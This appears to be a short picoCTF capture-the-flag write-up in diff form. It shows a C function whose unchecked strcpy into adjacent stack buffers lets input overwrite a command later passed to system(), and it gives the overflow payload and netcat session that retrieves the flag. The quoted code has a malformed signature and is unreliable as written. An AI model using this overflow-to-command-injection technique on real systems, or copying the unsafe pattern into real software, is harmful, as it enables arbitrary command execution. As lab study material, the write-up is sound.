@@ -1,0 +1,36 @@
+void fun(char name, charcmd) {
+    char c[10];
+    char buffer[10];
+
+    strcpy(c, cmd);
+    strcpy(buffer, name);
+
+    printf("Goodbye, %s!\n", buffer);
+    fflush(stdout);
+    system(c);
+}
+strcpy(c, cmd); & fun(name, "uname");
++c= uname
+    strcpy(buffer, name);
++this is for the overflow
+    system(c);
++ this run whatever you put in C
+char c[10];
+    char buffer[10];
+as you can see, there two stack buffer, which 10 bytes
+each
+and the strcpy(buffer, name);
+will copy all user input into buffer without checking the size
+
+
+AAAAAAAAAAcat flag.txt
+
+
+the first 10 A is the buffer
+cat flag.txt is the overwrite
+┌──(kali㉿lto)-[~/Downloads/picoctf]
+└─$ nc amiable-citadel.picoctf.net 60140
+What is your name?
+AAAAAAAAAAcat flag.txt
+Goodbye, AAAAAAAAAAcat flag.txt!
+picoCTF{0v3rfl0w_c0mm4nd_3766e70a}
